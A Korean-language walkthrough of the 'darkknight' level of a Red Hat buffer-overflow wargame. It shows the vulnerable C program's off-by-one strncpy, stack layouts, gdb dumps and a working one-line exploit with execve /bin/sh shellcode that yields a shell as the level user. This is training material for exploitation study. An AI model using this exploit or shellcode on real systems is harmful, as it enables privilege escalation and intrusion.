============================================================================================================
[redhat-lob] (12) darkknight
============================================================================================================

.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="dummy * 15 + shellcode + 1(sfp)"];
        b [shape=box, color=lightblue, label="strncpy"];
        c [shape=box, label="Buffer Overflow"];
        e [shape=box, label="(argv[1] address+4*i)"];
    }

|

source code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    void problem_child(char *src)
    {
        char buffer[40];
        strncpy(buffer, src, 41);
        printf("%s\n", buffer);
    }
    main(int argc, char *argv[])
    {
        if(argc<2){
            printf("argv error\n");
            exit(0);
        }
        problem_child(argv[1]);
    }


Vulnerabliity Vector
============================================================================================================

problem_child 함수의 sfp와 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of problem_child
    saved registers of problem_child
    return address of problem_child <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

Segmentation fault
============================================================================================================

어떤 값을 입력하더라도 세그먼트 폴트 오류가 발생함.

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./darkknight `python -c 'print "a"*41'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒▒K▒▒▒▒▒▒▒   @
    Segmentation fault




exploit
============================================================================================================

gdb를 통해 argv[1]값이 들어간 스택 부분을 확인

.. code-block:: console

    (gdb) disassemble problem_child
    Dump of assembler code for function problem_child:
    0x8048440 <problem_child>:      push   %ebp
    0x8048441 <problem_child+1>:    mov    %ebp,%esp
    0x8048443 <problem_child+3>:    sub    %esp,40
    0x8048446 <problem_child+6>:    push   41
    0x8048448 <problem_child+8>:    mov    %eax,DWORD PTR [%ebp+8]
    0x804844b <problem_child+11>:   push   %eax
    0x804844c <problem_child+12>:   lea    %eax,[%ebp-40]
    0x804844f <problem_child+15>:   push   %eax
    0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
    0x8048455 <problem_child+21>:   add    %esp,12
    0x8048458 <problem_child+24>:   lea    %eax,[%ebp-40]
    0x804845b <problem_child+27>:   push   %eax
    0x804845c <problem_child+28>:   push   0x8048500
    0x8048461 <problem_child+33>:   call   0x8048354 <printf>
    0x8048466 <problem_child+38>:   add    %esp,8
    0x8048469 <problem_child+41>:   leave
    0x804846a <problem_child+42>:   ret

    (gdb) b *problem_child+41
    Breakpoint 1 at 0x8048469
    (gdb) r `python -c 'print "a"*41'`
    Starting program: /home/golem/./jdarknight `python -c 'print "a"*41'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒▒N▒▒▒▒▒▒▒   @

    Breakpoint 1, 0x8048469 in problem_child ()
    (gdb) x/40x $ebp-40
    ===========     =============== =============== =============== ==========
    0xbffffac4:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffad4:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffae4:     0x61616161      0x61616161      0xbffffa61      0x0804849e
    0xbffffaf4:     0xbffffc4e      0xbffffb18      0x400309cb      0x00000002
    0xbffffb04:     0xbffffb44      0xbffffb50      0x40013868      0x00000002
    0xbffffb14:     0x08048390      0x00000000      0x080483b1      0x0804846c
    0xbffffb24:     0x00000002      0xbffffb44      0x080482e4      0x080484dc
    0xbffffb34:     0x4000ae60      0xbffffb3c      0x40013e90      0x00000002
    0xbffffb44:     0xbffffc35      0xbffffc4e      0x00000000      0xbffffc78
    0xbffffb54:     0xbffffc9a      0xbffffca4      0xbffffcb2      0xbffffcd1
    ===========     =============== =============== =============== ==========


|

argv[1] pointers 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of problem_child
    saved registers of problem_child
    return address of problem_child <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers ->> shellcode
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)
    ==============================

|


argv[1] : nop (15 byte) + shellcode (25 byte) + sfp (1 byte)

.. code-block:: console

    $ ./darkknight `python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xf0"'`

    bash$ whoami
    darkknight
    bash$ my-pass
    euid = 512
    new attacker


